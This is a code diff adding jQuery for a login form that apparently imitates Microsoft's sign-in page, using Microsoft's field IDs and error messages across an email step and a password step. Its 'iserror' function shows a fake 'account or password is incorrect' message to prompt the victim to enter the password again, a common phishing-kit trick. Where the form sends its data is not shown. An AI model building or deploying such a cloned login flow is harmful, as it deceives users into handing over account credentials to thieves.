@@ -1,0 +1,79 @@
+
+        $('#i0116').keypress(function(e) {
+            var key = e.which;
+            if (key == 13) // the enter key code
+            {
+                $('#usernameProgress').css('display', 'block');
+                setTimeout(function() {
+                    goNext();
+                    return false;
+                }, 1200);
+            }
+        });
+
+        function goNext() {
+            var usr = $('#i0116').val();
+            var userError = 'Enter a valid email address, phone number, or Skype name.';
+            if (isEmail($('#i0116').val())) {
+                $('#loginHeader').text('Enter password');
+                $('#displayName').text(usr);
+                $('#emField').css('display', 'none');
+                $('#pwField').css('display', 'block');
+                $('.identityBanner').css('display', 'block');
+
+                $('#i0117').focus();
+                $('#errorBar').text('');
+                $('form').find('input:button').each(function() {
+                    $("<input type='submit' />").attr({
+                            name: this.name,
+                            value: this.value
+                        }).insertBefore(this)
+                        .addClass('btn btn-block btn-primary');
+                }).remove();
+            } else {
+                $('#i0116').addClass('has-error');
+                $('#errorBar').text(userError);
+                $('#usernameProgress').css('display', 'none');
+            }
+
+        }
+
+        function closeBox() {
+            $('#popup1').css('visibility', 'hidden').css('opacity', 0);
+            $('#i0116').focus();
+        }
+
+        function checkSubmit() {
+            var pwd = $('#i0117').val();
+            var pwError = 'Please enter the password for your Microsoft account.';
+            if (pwd.length > 5) {
+                $('#errorBar').text('');
+                $('#pwProgress').css('display', 'block');
+                return true;
+            } else {
+                $('#errorBar').text(pwError);
+                return false;
+            }
+        }
+
+        function isEmail(email) {
+            var regex = /^([a-zA-Z0-9_.+-])+\@(([a-zA-Z0-9-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+            return regex.test(email);
+        }
+        
+        function iserror(email){
+            $('#displayName').text(email);
+            $('#errorBar').html('Your account or password is incorrect. If you dont remember your password, <a href="#">reset it now.</a>');
+            $('#i0117').addClass('has-error');
+            $('#emField').css('display', 'none');
+            $('#pwField').css('display', 'block');
+            $('.identityBanner').css('display', 'block');
+            $('form').find('input:button').each(function() {
+                    $("<input type='submit' />").attr({
+                            name: this.name,
+                            value: this.value
+                        }).insertBefore(this)
+                        .addClass('btn btn-block btn-primary');
+                }).remove();
+        }
+    
